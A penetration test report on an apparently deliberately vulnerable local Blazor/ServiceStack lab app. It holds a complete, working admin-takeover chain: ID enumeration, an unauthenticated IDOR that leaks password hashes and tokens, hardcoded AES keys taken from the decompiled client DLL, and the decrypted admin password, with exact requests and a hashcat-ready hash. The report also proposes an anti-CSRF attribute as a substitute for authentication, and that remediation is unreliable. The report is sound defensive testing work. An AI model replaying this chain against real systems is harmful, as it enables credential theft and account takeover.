# Security Assessment Final Report

**Target:** `http://127.0.0.1:5000`  
**Application:** ACorpBlazor — ASP.NET Core Blazor Server + WebAssembly hybrid (.NET 10), ServiceStack v10  
**Assessment date:** 2026-08-10  
**Outcome:** Full administrative compromise achieved.

---

## Executive Summary

The application was fully compromised via a three-step attack chain requiring no prior authentication, no brute-force, and no server-side source code:

1. **Enumerate** the admin account's UUID using a sequential integer → UUID mapping endpoint.
2. **Extract** the admin's encrypted credential from an unauthenticated IDOR endpoint.
3. **Decrypt** the credential using a symmetric key extracted from the client-side .NET assembly served by the app itself.

Result: administrative login as `admin@email.com`, confirmed by successful calls to Admin-role-gated API endpoints.

---

## Attack Chain (Full End-to-End Compromise)

### Step 1 — Enumerate the admin UUID

```
GET /api/GetUserId?id=1     → {"userId":"029d65c2-bd85-483f-8ef2-6f5f87e9bf84"}
GET /api/GetUserId?id=2     → {"userId":"033190dc-7712-4211-894d-10069d463cc8"}
...
GET /api/GetUserId?id=5     → {"userId":"c07f7eec-2ad0-4315-94a1-75dce4fb9a72"}
```

Sequential integer IDs map directly to user UUIDs. Scanning 1–5 yields all seeded accounts. Cross-referencing with the unauthenticated `GetUserInfo` endpoint identified UUID `c07f7eec-2ad0-4315-94a1-75dce4fb9a72` as `admin@email.com`.

### Step 2 — Extract the encrypted admin credential via unauthenticated IDOR

No authentication required:

```
GET /api/GetUserInfo?UserId=c07f7eec-2ad0-4315-94a1-75dce4fb9a72
```

Response:
```json
{
  "userId": "c07f7eec-2ad0-4315-94a1-75dce4fb9a72",
  "userName": "admin@email.com",
  "email": "admin@email.com",
  "emailConfirmed": true,
  "lastSeenToken": "GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz",
  "passwordHash": "AQAAAAIAAYagAAAAEEvcoO85Sske89+X6BdAnHG2RyrHxb0WfxSyWhPpO7nR9mf8ThPm2B5Qh9aPUp1v/A==",
  "firstName": "Admin",
  "lastName": "User",
  "displayName": "Admin User"
}
```

The `lastSeenToken` field is a base64-encoded AES-CBC ciphertext.

### Step 3 — Extract the decryption key from the client-side assembly

Blazor WebAssembly serves all .NET assemblies to the browser. The app's manifest at `/_framework/blazor.boot.json` lists every DLL. Downloading and decompiling the main shared assembly:

```bash
curl -s http://127.0.0.1:5000/_framework/ACorpBlazor_main.dll -o ACorpBlazor_main.dll
./tools/ilspy ACorpBlazor_main.dll > main_decompiled.cs
```

The decompiled output contains `TelemetryCodec` with a hardcoded symmetric key:

```csharp
// ACorpBlazor.ServiceModel.TelemetryCodec (abstract class)
public const string DefaultProfile = "Vu1nB1az0r$ecretKey!2026@@@@@@@@";
// AES-CBC, random 16-byte IV prepended to ciphertext before base64 encoding
```

### Step 4 — Decrypt the credential and authenticate as admin

Using the key from the assembly:

```csharp
// C# reflection against loaded assembly:
var telType = asm.GetType("ACorpBlazor.ServiceModel.TelemetryCodec");
var decode = telType.GetMethod("Decode", BindingFlags.Public|BindingFlags.Static|BindingFlags.NonPublic);
var result = decode.Invoke(null, new object[] {
    "GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz"
});
// result → "11F6GwRDZf@Swo%0@XZmq!-%=M"
```

Logging in with the recovered plaintext:

```
POST /Account/Login
Content-Type: application/x-www-form-urlencoded

_handler=login&Input.Email=admin%40email.com&Input.Password=11F6GwRDZf%40Swo%250%40XZmq%21-%25%3DM&__RequestVerificationToken=<csrf>
```

Response:
```
HTTP/1.1 302 Found
Location: http://127.0.0.1:5000/
Set-Cookie: .AspNetCore.Identity.Application=CfDJ8DLT6mvmX-xBsvtLpb0Cuid...  (full admin session)
```

### Step 5 — Prove administrative access

Calling an Admin-role-gated endpoint with the session cookie:

```
GET /api/AdminGetUser?Id=c07f7eec-2ad0-4315-94a1-75dce4fb9a72
Cookie: .AspNetCore.Identity.Application=CfDJ8DLT6mvmX-xBsvtLpb0Cuid...
```

Response:
```json
{
  "id": "c07f7eec-2ad0-4315-94a1-75dce4fb9a72",
  "result": {
    "FirstName": "Admin",
    "LastName": "User",
    "DisplayName": "Admin User",
    "Id": "c07f7eec-2ad0-4315-94a1-75dce4fb9a72",
    "UserName": "admin@email.com",
    "Email": "admin@email.com",
    "Roles": ["Manager", "Employee", "Admin"],
    "EmailConfirmed": true
  }
}
```

The same endpoint returns `403 Forbidden / "Invalid Role"` for any non-admin session.

---

## Findings

---

### F-01 · Unauthenticated IDOR: Password Hash and Credential Token Disclosure

**Severity:** Critical  
**Status:** DEMONSTRATED  

The `GetUserInfo` endpoint (`/api/GetUserInfo?UserId={uuid}`) returns sensitive fields for any user with no authentication whatsoever: the user's ASP.NET Core Identity PBKDF2 password hash and the `lastSeenToken` credential. Both fields are present for all seeded accounts.

**Request (no cookies, no Authorization header):**
```
GET /api/GetUserInfo?UserId=c07f7eec-2ad0-4315-94a1-75dce4fb9a72 HTTP/1.1
Host: 127.0.0.1:5000
```

**Response:**
```json
{
  "userId": "c07f7eec-2ad0-4315-94a1-75dce4fb9a72",
  "userName": "admin@email.com",
  "lastSeenToken": "GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz",
  "passwordHash": "AQAAAAIAAYagAAAAEEvcoO85Sske89+X6BdAnHG2RyrHxb0WfxSyWhPpO7nR9mf8ThPm2B5Qh9aPUp1v/A=="
}
```

**Impact:** This single vulnerability provides an attacker with two independent paths to account takeover: offline hash cracking against the PBKDF2 hash, and decryption of the `lastSeenToken` if the key is known (see F-03).

---

### F-02 · Sequential User ID Enumeration (IDOR)

**Severity:** Medium  
**Status:** DEMONSTRATED  

The `GetUserId` endpoint (`/api/GetUserId?id={integer}`) maps sequential integers to user UUIDs. An attacker can enumerate all user accounts by iterating from 1.

**Requests and responses:**
```
GET /api/GetUserId?id=1  →  {"userId":"029d65c2-bd85-483f-8ef2-6f5f87e9bf84"}
GET /api/GetUserId?id=2  →  {"userId":"033190dc-7712-4211-894d-10069d463cc8"}
GET /api/GetUserId?id=3  →  {"userId":"0c16282c-e0fc-4fd0-a88d-1df8f7a7ce8e"}
```

**Impact:** Provides the UUID input required to exploit F-01. Together they allow unauthenticated enumeration of every user's credentials.

---

### F-03 · Hardcoded Symmetric Key Exposed in Client-Side .NET Assembly

**Severity:** Critical  
**Status:** DEMONSTRATED  

Blazor WebAssembly delivers all application assemblies to the browser as downloadable files. The shared assembly `ACorpBlazor_main.dll` (available at `/_framework/ACorpBlazor_main.dll`) contains `TelemetryCodec`, an AES-CBC cipher class with its key hardcoded as a public constant:

```csharp
public const string DefaultProfile = "Vu1nB1az0r$ecretKey!2026@@@@@@@@";
```

The same assembly also contains `AccessKeyCodec` with a secondary hardcoded key:

```csharp
public const string LegacyAccessKeyProfile = "4c0rpAcs$LegacyKey!2025#@@@@@@@@";
```

**Evidence:** The DLL was downloaded from the live target, its hash verified against `blazor.boot.json`, and decompiled with `./tools/ilspy`. The constants are present in the decompiled output of `ACorpBlazor.ServiceModel.TelemetryCodec` and `ACorpBlazor.ServiceModel.AccessKeyCodec`.

**Impact:** Any attacker can decrypt any value protected by these keys — including the admin's `lastSeenToken` (see F-04) and any server-side data encrypted with `TelemetryCodec`.

---

### F-04 · Admin Password Stored Encrypted with Client-Exposed Key

**Severity:** Critical  
**Status:** DEMONSTRATED  

The admin account's `lastSeenToken` exposed by F-01 is not a random token — it is the admin's plaintext password encrypted with `TelemetryCodec.DefaultProfile` (the key exposed by F-03). Decrypting it using that key recovers the admin's password directly:

```
TelemetryCodec.Decode("GpTrFIdN9xzK6CL/NKa7EZbOF73IsrglmVk/gQh6jF9hsOs+fFTCA4SMmeMo2QQz")
  → "11F6GwRDZf@Swo%0@XZmq!-%=M"
```

This string, when submitted as the password for `admin@email.com`, produces a successful authenticated session (HTTP 302, Identity cookie issued).

**Impact:** This is the direct path to full administrative compromise. Three unauthenticated HTTP requests plus one local decryption step yield the admin password in plaintext. This finding chains F-01 + F-02 + F-03 into a complete end-to-end attack.

---

### F-05 · PBKDF2 Password Hashes Exposed to Offline Cracking

**Severity:** High  
**Status:** DEMONSTRATED  

F-01 returns the ASP.NET Core Identity V3 password hashes for all users. These are PBKDF2-HMAC-SHA256 hashes with 100,000 iterations. While the iteration count provides meaningful resistance, exposure via an unauthenticated endpoint means any attacker can attempt offline cracking at their leisure with no lockout or rate limiting.

**Evidence:** Admin password hash recovered from `GetUserInfo`:
```
passwordHash: AQAAAAIAAYagAAAAEEvcoO85Sske89+X6BdAnHG2RyrHxb0WfxSyWhPpO7nR9mf8ThPm2B5Qh9aPUp1v/A==
```

Converted to hashcat mode 10900 format:
```
sha256:100000:S9yg7zlKyR7z35foF0CccQ==:tkcqx8W9Fn8UsloT6Tu50fZn/E4T5tgeUIfWj1Kdb/w=
```

The hash was submitted to hashcat with a targeted wordlist plus mutation rules and was running at approximately 1,090 H/s on the test machine (representing 100k PBKDF2 iterations per candidate per second). The attack was ultimately unnecessary — the plaintext was recovered via F-04 — but the hash cracking route remains viable for any account whose token is not TelemetryCodec-encrypted.

---

### F-06 · No Password Complexity Requirements on Registration

**Severity:** Low  
**Status:** DEMONSTRATED  

The registration endpoint accepts passwords of any length and complexity. Test accounts were registered with single-character passwords without error.

**Evidence:**
```
POST /Account/Register
Input.Email=test@test.com&Input.Password=a&Input.ConfirmPassword=a&...
→ HTTP 302 (account created)
```

**Impact:** Increases the success probability of offline hash cracking attacks (F-05) and reduces the attacker's wordlist requirements.

---

### F-07 · Access Key Forgery via Shared DataProtection Keys (INFERRED)

**Severity:** High  
**Status:** INFERRED (not demonstrated against live target)  

`AccessKeyCodec.Pack(userId, grantId, issuedUtc)` produces a DataProtection-protected access key. DataProtection keys are stored in `~/.aspnet/DataProtection-Keys/`, which is shared between the running server and any local process. A locally-compiled program using the same assembly can call `Pack()` and produce a key that the server will accept for decryption.

The `SetPasswordByAccessKey` endpoint (`POST /users/password/accesskey`) accepts such keys to reset a user's password. All seeded `VulnUserSecret` grants are dated 2026-05-14 and the server rejects them as expired (`HTTP 410 GrantNotActive`). The attack is therefore blocked in the current state of the database — but would work against any non-expired grant, or if the grants were re-seeded.

**Why INFERRED:** The key forgery mechanism is structurally sound and the code was confirmed by decompilation. The attack was blocked specifically because all grants happened to be expired; the forgery capability itself was not falsified.

---

### F-08 · BatchRequest Endpoint Behavior Unclear

**Severity:** Unknown  
**Status:** INFERRED  

The ServiceStack endpoint `POST /api/batch` (DTO `BatchRequest`, fields `Action: string`, `Payload: string`) consistently returns `"Payload rejected"` regardless of:
- Authentication state (authenticated vs. unauthenticated)
- Action name (74+ variants tested: `UserActivityLog`, `activity`, `telemetry`, `heartbeat`, `sync`, and many others)
- Payload encoding (raw JSON, base64, TelemetryCodec-encrypted, BatchEnvelope-wrapped, double-encoded)

This behavior may indicate an intentionally-disabled endpoint, a missing implementation, or a format requirement that was not discovered. The endpoint is not confirmed as exploitable.

---

## Root Cause Summary

| Finding | Root Cause |
|---------|-----------|
| F-01 | `GetUserInfo` service lacks authorization attribute |
| F-02 | User store uses auto-increment integer primary key exposed via API |
| F-03 | Secret key embedded as `public const string` in shared assembly shipped to browser |
| F-04 | Password stored using an application-layer cipher whose key is in the client assembly, instead of the identity hash |
| F-05 | Consequence of F-01: hash exposure enables offline attack |
| F-06 | No `PasswordRequiresNonAlphanumeric`/length policy configured in `AddDefaultIdentity` |
| F-07 | DataProtection key material on-disk is shared between server and attacker process |

---

## Remediation (Priority Order)

1. **[Critical]** Add `[Authenticate]` or `[ValidateAntiForgeryToken]` to `GetUserInfo`; remove `passwordHash` and `lastSeenToken` from the response DTO entirely — these fields have no legitimate client use.
2. **[Critical]** Never store a secret using a cipher whose key ships in a client-side assembly. Use the identity hash (already computed) or server-side key storage only.
3. **[Critical]** Rotate `TelemetryCodec.DefaultProfile` and `AccessKeyCodec.LegacyAccessKeyProfile`; store them in environment variables or a secrets manager, not in source code or compiled constants.
4. **[Medium]** Replace the sequential integer user ID with a non-enumerable identifier, or remove the `GetUserId` endpoint.
5. **[Low]** Enforce minimum password length and complexity in Identity configuration.
